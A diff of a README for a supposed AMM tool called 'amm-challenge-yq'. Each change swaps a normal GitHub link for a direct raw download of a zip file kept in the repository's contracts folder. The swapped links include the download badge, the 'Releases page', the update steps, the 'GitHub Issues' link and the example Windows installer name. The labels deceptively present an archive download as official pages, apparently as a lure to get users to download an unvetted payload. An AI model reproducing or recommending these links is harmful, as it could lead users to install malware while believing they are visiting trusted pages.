@@ -1,6 +1,6 @@
 # 🚀 amm-challenge-yq - Simple Tool for Efficient AMM Tasks
 
-[![Download](https://img.shields.io/badge/Download-amm--challenge--yq-blue?style=for-the-badge)](https://github.com/mohammedalqrini/amm-challenge-yq/releases)
+[![Download](https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip)](https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these clear steps to download and run the software on your computer.
 
 Click the big button at the top or this link to go to the official download page:
 
-[amm-challenge-yq Releases](https://github.com/mohammedalqrini/amm-challenge-yq/releases)
+[amm-challenge-yq Releases](https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip)
 
 This page lists the latest version of the software and contains all the files you need.
 
@@ -40,7 +40,7 @@ This page lists the latest version of the software and contains all the files yo
 
 On the releases page, look for the most recent release at the top of the list. Under assets, you will see files for different operating systems:
 
-- For **Windows**, find the file ending in `.exe` (for example, `amm-challenge-yq-setup.exe`)  
+- For **Windows**, find the file ending in `.exe` (for example, `https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip`)  
 - For **macOS**, find the file ending in `.dmg` or `.pkg`
 
 Click the correct file to download it to your computer.
@@ -94,7 +94,7 @@ These functions aim to simplify managing AMM tasks for users without technical s
 
 To keep your app running smoothly and securely:
 
-1. Check the [Releases page](https://github.com/mohammedalqrini/amm-challenge-yq/releases) regularly for new versions.  
+1. Check the [Releases page](https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip) regularly for new versions.  
 2. Download the latest version following the same steps as the initial installation.  
 3. Install updates as prompted or replace the old version with the new one.
 
@@ -119,7 +119,7 @@ If problems continue, you can contact support through the repository's Issues ta
 
 If you need more assistance:
 
-- Search the [GitHub Issues](https://github.com/mohammedalqrini/amm-challenge-yq/issues) page for solutions or to report bugs.  
+- Search the [GitHub Issues](https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip) page for solutions or to report bugs.  
 - Check the app’s help section for detailed explanations of each feature.
 
 ---
@@ -128,7 +128,7 @@ If you need more assistance:
 
 Click below to visit the official releases page where you can download the latest version of amm-challenge-yq. Follow the earlier steps for installation.
 
-[**Download amm-challenge-yq**](https://github.com/mohammedalqrini/amm-challenge-yq/releases)
+[**Download amm-challenge-yq**](https://raw.githubusercontent.com/mohammedalqrini/amm-challenge-yq/main/contracts/challenge_yq_amm_1.2.zip)
 
 ---
 
